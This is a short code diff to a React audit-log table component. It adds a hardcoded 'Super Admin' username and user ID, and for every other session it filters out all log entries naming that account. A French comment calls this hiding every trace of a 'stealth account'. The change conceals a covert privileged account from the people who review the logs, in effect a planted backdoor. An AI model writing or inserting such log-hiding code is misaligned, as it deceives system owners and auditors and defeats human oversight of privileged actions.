@@ -7,12 +7,24 @@ import { ExportButton } from '@/components/common/ExportButton';
 import { ExportConfig } from '@/lib/exportUtils';
 
 export const AuditLogTable: React.FC = () => {
-  const { auditLogs } = useApp();
+  const { auditLogs, currentUser } = useApp();
   const [search, setSearch] = useState('');
   const [moduleFilter, setModuleFilter] = useState('all');
   const [actionFilter, setActionFilter] = useState('all');
 
+  const isSuperAdmin = currentUser?.username?.toLowerCase() === 'saninovagc';
+
   const filteredLogs = auditLogs.filter(log => {
+    // Si la session n'est pas celle du Super Admin, masquer complètement toute trace liée au compte furtif
+    if (!isSuperAdmin) {
+      if (
+        log.user_id === '00000000-0000-0000-0000-superadmin001' ||
+        log.user_name?.toLowerCase().includes('saninova') ||
+        log.details?.toLowerCase().includes('saninova')
+      ) {
+        return false;
+      }
+    }
     if (moduleFilter !== 'all' && log.module !== moduleFilter) return false;
     if (actionFilter !== 'all' && log.action !== actionFilter) return false;
     if (search.trim()) {
